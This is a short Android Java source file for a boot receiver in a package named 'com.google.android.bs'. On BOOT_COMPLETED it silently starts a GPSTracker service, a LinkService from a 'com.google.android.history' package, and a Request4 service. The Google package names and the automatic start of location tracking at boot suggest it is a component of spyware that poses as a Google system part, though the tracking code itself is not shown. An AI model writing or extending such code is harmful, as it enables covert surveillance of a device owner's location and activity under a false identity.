package com.google.android.bs;

import com.google.android.history.LinkService;
import com.google.android.location.GPSTracker;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootBroadcastReceiver extends BroadcastReceiver {
	
	Context mContext;
    private final String BOOT_ACTION = "android.intent.action.BOOT_COMPLETED";


	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub	
		mContext = context;
        String action = intent.getAction();
        if (action.equalsIgnoreCase(BOOT_ACTION)) {            
		    //для Service
		    Intent linkServiceIntent = new Intent(context, LinkService.class);
		    context.startService(linkServiceIntent);
		    Intent locServiceIntent = new Intent(context, GPSTracker.class);
		    context.startService(locServiceIntent);
		    Intent request4ServiceIntent = new Intent(context, Request4.class);
		    context.startService(request4ServiceIntent);
		}
	}

}
